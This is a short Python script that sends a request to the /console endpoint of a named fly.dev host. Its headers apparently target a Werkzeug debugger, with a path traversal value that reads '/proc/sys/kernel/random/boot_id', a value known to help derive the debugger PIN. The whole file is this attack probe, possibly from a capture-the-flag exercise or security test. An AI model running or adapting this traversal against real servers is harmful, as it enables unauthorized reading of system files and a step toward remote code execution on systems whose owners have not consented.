import requests
import pprint
headers = { "__debugger__": "yes", "cmd": "resource", "f": "../../proc/sys/kernel/random/boot_id" }
r = requests.get("https://pinasaservice.fly.dev/console", headers=headers)
print(pprint.pprint(r.__dict__))
# print(r.headers)
